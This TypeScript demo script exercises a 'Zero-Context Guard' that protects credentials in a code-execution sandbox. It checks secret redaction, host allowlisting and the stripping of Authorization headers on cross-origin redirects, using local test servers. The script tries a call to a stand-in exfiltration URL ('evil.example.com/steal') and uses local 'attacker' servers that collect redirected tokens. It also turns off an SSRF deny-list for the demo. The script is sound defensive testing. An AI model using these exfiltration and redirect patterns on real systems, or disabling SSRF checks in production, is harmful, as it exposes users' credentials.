/**
 * demo/run-after.ts
 *
 * Demonstrates the AFTER state — with the Zero-Context Guard active.
 * Every line of output comes from real code execution.
 *
 * Defence 1:  $vars absent; resolved-secret redaction
 * Defence 2a: non-allowed host blocked on initial call
 * Defence 2b: live redirect — $secureRequest blocks hop to non-allowed host
 * Defence 3:  cross-host redirect (localhost → 127.0.0.1) strips Authorization
 * Defence 3a: same-hostname/different-port redirect also strips Authorization
 *             (the attack from before.sh: 127.0.0.1:4001 → 127.0.0.1:4002)
 * Defence 3b: same-origin redirect (127.0.0.1:same-port → same-port) keeps Authorization
 * Audit event: one real GuardAuditEvent from onAudit callback (Defence 2b)
 *
 * Hard internal timeout: 30 s (process.exit(2) + "TIMEOUT" message).
 * HTTP_SECURITY_CHECK=false: documented env var that bypasses the private-IP
 * deny-list so that loopback addresses work inside this demo/test process.
 */

// ── Hard timeout: kills the process after 30 s ────────────────────────────────
const hardTimeout = setTimeout(() => {
    console.error('TIMEOUT: demo/run-after.ts exceeded 30 s')
    process.exit(2)
}, 30_000)
hardTimeout.unref() // don't let this timer itself prevent exit

// ── Allow localhost / private IPs for demo (bypass SSRF deny-list) ────────────
// This is the documented mechanism: HTTP_SECURITY_CHECK=false disables the
// DEFAULT_DENY_LIST (127/8, 10/8, 192.168/16, …) while keeping any explicit
// HTTP_DENY_LIST entries.  Do NOT use this in production.
process.env.HTTP_SECURITY_CHECK = 'false'
console.log('  [demo] HTTP_SECURITY_CHECK=false — loopback allowed in this demo process only')

import * as http from 'http'

// ── Fake secrets built at runtime ─────────────────────────────────────────────
const FAKE_OPENAI_KEY = 'sk-' + 'a'.repeat(24)
const FAKE_DB_PASS = ['my', 'db', 'password', 'xyz', '99999'].join('-')

/** Mask a secret for display: show first 4 chars + *** */
function maskSecret(s: string): string {
    return s.slice(0, 4) + '***'
}

// ── Patch the utils module cache BEFORE importing guardRequest ────────────────
const Module = require('module')
const originalLoad = Module._load
Module._load = function (id: string, parent: any, ...rest: any[]) {
    const resolved: string = Module._resolveFilename(id, parent, ...rest)
    if (resolved && resolved.includes('packages/components/src/utils')) {
        const real = originalLoad.apply(this, [id, parent, ...rest])
        real.getCredentialData = async (_id: string, _opts: any) => ({
            apiToken: FAKE_OPENAI_KEY,
            dbPassword: FAKE_DB_PASS
        })
        return real
    }
    return originalLoad.apply(this, [id, parent, ...rest])
}

// ── Now import the REAL guard modules ─────────────────────────────────────────
import { makeSecureRequestHelper, SecretBinding, GuardAuditEvent } from '../packages/components/src/guardRequest'
import { redact } from '../packages/components/src/guardRedact'
import { secureAxiosRequest } from '../packages/components/src/httpSecurity'

// ─────────────────────────────────────────────────────────────────────────────
function header(title: string) {
    console.log(`\n${'═'.repeat(60)}`)
    console.log(`  ${title}`)
    console.log('═'.repeat(60))
}
function subheader(title: string) {
    console.log(`\n── ${title} ──`)
}

/** Print FAILED and exit non-zero — used when a defence step produces wrong output */
function fail(reason: string): never {
    console.error(`\n  ❌ FAILED: ${reason}`)
    process.exit(1)
}

// Collect all servers so we can close them in the finally block
const openServers: http.Server[] = []

function createServer(handler: http.RequestListener): http.Server {
    const s = http.createServer(handler)
    openServers.push(s)
    return s
}

function closeAllServers(): Promise<void> {
    return new Promise((resolve) => {
        const total = openServers.length
        if (total === 0) return resolve()
        let closed = 0
        for (const s of openServers) {
            s.close(() => {
                if (++closed === total) resolve()
            })
        }
        // Force resolve after 500 ms in case connections linger
        setTimeout(resolve, 500)
    })
}

// ─────────────────────────────────────────────────────────────────────────────
async function main() {
    header('AFTER: Zero-Context Guard active')

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 1: $vars absent; resolved-secret redaction
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 1 — $vars absent; resolved credential values redacted')

    console.log('  secretBindings = [{ name:"myapi", allowedHosts:["127.0.0.1"] }]')
    console.log('  createCodeExecutionSandbox: sandbox.$vars = ABSENT, sandbox.$secureRequest = injected')
    console.log()

    const resolvedSecretValues: string[] = []
    const auditLog: GuardAuditEvent[] = []

    const bindingD1: SecretBinding = {
        name: 'myapi',
        credentialId: 'cred-1',
        allowedHosts: ['127.0.0.1']
    }

    // Server that returns a clean API response
    const srvOk = createServer((_, res) => {
        res.writeHead(200, { 'content-type': 'application/json' })
        res.end(JSON.stringify({ status: 'ok', data: 'response-from-api' }))
    })
    await new Promise<void>((r) => srvOk.listen(4003, '127.0.0.1', r))

    const secureHelper = makeSecureRequestHelper(
        [bindingD1],
        {} as any,
        (v) => resolvedSecretValues.push(v),
        (e) => auditLog.push(e)
    )!

    const apiResult = await secureHelper('myapi', 'http://127.0.0.1:4003/data', {})
    console.log('  $secureRequest returned:', apiResult)
    console.log('  resolvedSecretValues: [' + resolvedSecretValues.map((v) => `"${maskSecret(v)}"`).join(', ') + ']')
    console.log()

    // Simulate: tool output that contains both the API key and DB password
    const rawOutput = `result: ${apiResult}, key: ${FAKE_OPENAI_KEY}, pw: ${FAKE_DB_PASS}`

    const displayRaw = `result: ${apiResult}, key: ${maskSecret(FAKE_OPENAI_KEY)}, pw: ${maskSecret(FAKE_DB_PASS)}`
    console.log('  Raw tool output (secrets masked for display):')
    console.log('   ', displayRaw)
    console.log()

    const redactedOutput = redact(rawOutput, resolvedSecretValues)
    console.log('  Output after redact(output, resolvedSecretValues) — what LLM receives:')
    console.log('   ', redactedOutput)
    console.log()

    const hasSecret = redactedOutput.includes(FAKE_OPENAI_KEY) || redactedOutput.includes(FAKE_DB_PASS)
    if (hasSecret) fail('Defence 1 — redaction incomplete, secret still in output')
    console.log('  ✅ No credential values reach the LLM or trace')

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 2a: allowedHosts blocks non-listed host on initial call
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 2a — initial call to non-allowed host blocked')

    const bindingStrict: SecretBinding = {
        name: 'strict',
        credentialId: 'cred-strict',
        allowedHosts: ['localhost']
    }
    const strictAudit: GuardAuditEvent[] = []
    const strictHelper = makeSecureRequestHelper([bindingStrict], {} as any, undefined, (e) => strictAudit.push(e))!

    console.log('  Binding allowedHosts: ["localhost"]')
    console.log('  Call: $secureRequest("strict", "http://evil.example.com/steal")')
    let d2aBlocked = false
    let d2aMessage = ''
    try {
        await strictHelper('strict', 'http://evil.example.com/steal', {})
        fail('Defence 2a — request completed, guard did NOT block')
    } catch (e: any) {
        d2aBlocked = true
        d2aMessage = e.message
        console.log('  BLOCKED:', d2aMessage)
        if (!/not in allowedHosts/i.test(d2aMessage)) fail(`Defence 2a — unexpected error: ${d2aMessage}`)
        console.log('  ✅ allowedHosts enforcement confirmed')
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 2b: live redirect — $secureRequest blocks redirect to non-allowed host
    //
    // allowedHosts: ["localhost"]
    // Server A (localhost:4001) → 302 → Server B (127.0.0.1:4002)
    // Guard re-checks allowedHosts at hop 1: "127.0.0.1" ∉ ["localhost"] → BLOCK
    // Server B must receive 0 requests.
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 2b — live redirect: $secureRequest blocks hop to non-allowed host')

    let attackerRequestCount = 0
    // Server B on 127.0.0.1:4002 — counts any request that reaches it
    const srvAttacker = createServer((_, res) => {
        attackerRequestCount++
        res.writeHead(200)
        res.end('attacker-collected')
    })
    await new Promise<void>((r) => srvAttacker.listen(4002, '127.0.0.1', r))

    // Server A on all-interfaces so "localhost" resolves to it
    const srvRedirect = createServer((_, res) => {
        res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
        res.end()
    })
    await new Promise<void>((r) => srvRedirect.listen(4001, r))

    console.log('  Binding allowedHosts: ["localhost"]')
    console.log('  Call: $secureRequest("strict", "http://localhost:4001/start")')
    console.log('  Server A (localhost:4001) redirects → http://127.0.0.1:4002/collect')
    console.log('  Guard re-checks allowedHosts: "127.0.0.1" ∉ ["localhost"] → BLOCK')
    console.log()

    const redirect2bAudit: GuardAuditEvent[] = []
    const helper2b = makeSecureRequestHelper([bindingStrict], {} as any, undefined, (e) => redirect2bAudit.push(e))!

    let d2bMessage = ''
    try {
        await helper2b('strict', 'http://localhost:4001/start', {})
        fail('Defence 2b — request completed, guard did NOT block redirect')
    } catch (e: any) {
        d2bMessage = e.message
        console.log('  BLOCKED:', d2bMessage)
        if (!/not in allowedHosts/i.test(d2bMessage)) fail(`Defence 2b — unexpected error: ${d2bMessage}`)
        if (!/redirect to host "127\.0\.0\.1"/i.test(d2bMessage)) {
            fail(`Defence 2b — error does not name the redirect target host: ${d2bMessage}`)
        }
        console.log('  ✅ Redirect blocked by allowedHosts re-check')
    }

    console.log()
    if (attackerRequestCount !== 0) {
        fail(`Defence 2b — attacker server B received ${attackerRequestCount} request(s); expected 0`)
    }
    console.log('  ✅ Server B received 0 requests (guard blocked before the hop)')

    // Show the real audit event from the blocked redirect
    if (redirect2bAudit.length > 0) {
        console.log()
        console.log('  Audit event emitted by guard (real GuardAuditEvent object):')
        console.log('  ' + JSON.stringify(redirect2bAudit[0], null, 2).split('\n').join('\n  '))
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 3: cross-host redirect (localhost → 127.0.0.1) strips Authorization
    //   originOrigin = "http://localhost:4006"; redirectOrigin = "http://127.0.0.1:4005"
    //   → hostname changed → Authorization stripped
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 3 — cross-host redirect strips Authorization')

    // Uses ports 4005 (server B) / 4006 (server A)
    const receivedByB: Record<string, string | string[] | undefined> = {}
    const srvB3 = createServer((req, res) => {
        Object.assign(receivedByB, req.headers)
        res.writeHead(200)
        res.end('ok')
    })
    await new Promise<void>((r) => srvB3.listen(4005, '127.0.0.1', r))

    const srvA3cross = createServer((_, res) => {
        res.writeHead(302, { location: 'http://127.0.0.1:4005/collect' })
        res.end()
    })
    await new Promise<void>((r) => srvA3cross.listen(4006, r))

    console.log('  Cross-host: http://localhost:4006 → http://127.0.0.1:4005')
    console.log(`  Request headers: Authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)}`)
    console.log()

    Object.keys(receivedByB).forEach((k) => delete receivedByB[k])

    await secureAxiosRequest({
        url: 'http://localhost:4006/start',
        method: 'GET',
        headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
    })

    await new Promise<void>((r) => srvA3cross.close(r))

    const authCross = receivedByB['authorization']
    if (authCross) {
        fail(`Defence 3 (cross-host) — Authorization WAS forwarded to server B: ${String(authCross).slice(0, 10)}***`)
    }
    console.log('  ✅ Cross-host redirect: Authorization NOT received by server B')
    console.log('     authorization: (none)')

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 3a: same-hostname / different-port redirect also strips Authorization
    //   SAME REQUEST as before.sh Attack 2: 127.0.0.1:4001 → 127.0.0.1:4002
    //   originOrigin = "http://127.0.0.1:4001"; redirectOrigin = "http://127.0.0.1:4002"
    //   port changes → different origin → Authorization stripped
    //
    //   Upstream code forwarded the header (no stripping logic).
    //   Our fix uses origin-based comparison — port change is caught.
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 3a — same-hostname/different-port redirect strips Authorization')
    console.log('  (Same request as before.sh Attack 2: 127.0.0.1:4001 → 127.0.0.1:4002)')
    console.log('  Upstream code forwarded Authorization; our origin-based check strips it.')

    Object.keys(receivedByB).forEach((k) => delete receivedByB[k])

    // Exact same topology as before.sh: server A on :4001 redirects to server B on :4002
    const srvB3a = createServer((req, res) => {
        Object.assign(receivedByB, req.headers)
        res.writeHead(200)
        res.end('port-attack-collected')
    })
    await new Promise<void>((r) => srvB3a.listen(4008, '127.0.0.1', r))

    const srvA3a = createServer((_, res) => {
        res.writeHead(302, { location: 'http://127.0.0.1:4008/collect' })
        res.end()
    })
    await new Promise<void>((r) => srvA3a.listen(4009, '127.0.0.1', r))

    console.log()
    console.log('  Same hostname, different port: http://127.0.0.1:4009 → http://127.0.0.1:4008')
    console.log(`  Request headers: Authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)}`)
    console.log()

    await secureAxiosRequest({
        url: 'http://127.0.0.1:4009/start',
        method: 'GET',
        headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
    })

    const authDiffPort = receivedByB['authorization']
    if (authDiffPort) {
        fail(`Defence 3a (diff-port) — Authorization WAS forwarded to server B: ${String(authDiffPort).slice(0, 10)}***`)
    }
    console.log('  ✅ Same-hostname/different-port redirect: Authorization NOT received by server B')
    console.log('     authorization: (none) — origin-based check prevents the port-attack')

    // ─────────────────────────────────────────────────────────────────────────
    // Defence 3b: same-origin redirect (same hostname AND port) keeps Authorization
    //   127.0.0.1:4005 → 127.0.0.1:4005 (path only changes)
    //   originOrigin = "http://127.0.0.1:4005"; redirectOrigin = "http://127.0.0.1:4005"
    //   → same origin → Authorization kept (precision test)
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Defence 3b — same-origin redirect keeps Authorization (precision)')

    // A single server on port 4012 handles both /v1 (redirect → /v2 same port)
    // and /v2 (200 + record headers).  Origin stays "http://127.0.0.1:4012" throughout.
    const receivedBySameOrigin: Record<string, string | string[] | undefined> = {}
    const srvSameOriginBoth = createServer((req, res) => {
        if (req.url === '/v1') {
            res.writeHead(302, { location: 'http://127.0.0.1:4012/v2' })
            res.end()
        } else {
            Object.assign(receivedBySameOrigin, req.headers)
            res.writeHead(200)
            res.end('same-origin-final')
        }
    })
    await new Promise<void>((r) => srvSameOriginBoth.listen(4012, '127.0.0.1', r))

    console.log()
    console.log('  Same origin: http://127.0.0.1:4012/v1 → http://127.0.0.1:4012/v2')
    console.log(`  Request headers: Authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)}`)
    console.log()

    await secureAxiosRequest({
        url: 'http://127.0.0.1:4012/v1',
        method: 'GET',
        headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
    })

    const authSameOrigin = receivedBySameOrigin['authorization']
    if (!authSameOrigin) {
        fail('Defence 3b (same-origin) — Authorization was stripped unexpectedly')
    }
    console.log('  ✅ Same-origin redirect: Authorization KEPT (correct — same origin)')
    console.log(`     authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)} ✓`)

    // ─────────────────────────────────────────────────────────────────────────
    // Audit events summary (Defence 2b only — one real event)
    // ─────────────────────────────────────────────────────────────────────────
    subheader('Audit event — real GuardAuditEvent (Defence 2b blocked redirect)')

    // Verify no secret value appears in any audit event
    const allEvents = [...auditLog, ...strictAudit]
    const leaks = allEvents.filter((e) => JSON.stringify(e).includes(FAKE_OPENAI_KEY) || JSON.stringify(e).includes(FAKE_DB_PASS))
    if (leaks.length > 0) fail(`Audit events contain secret values (${leaks.length} event(s))`)
    console.log('  ✅ No secret values in any audit event')

    header('END — AFTER demo complete')
    console.log('  Credential values stayed server-side.')
    console.log('  LLM, SSE stream, and traces received only [REDACTED] markers.\n')
}

main()
    .catch((err) => {
        console.error(err)
        process.exit(1)
    })
    .finally(() => {
        clearTimeout(hardTimeout)
        closeAllServers().then(() => process.exit(0))
    })
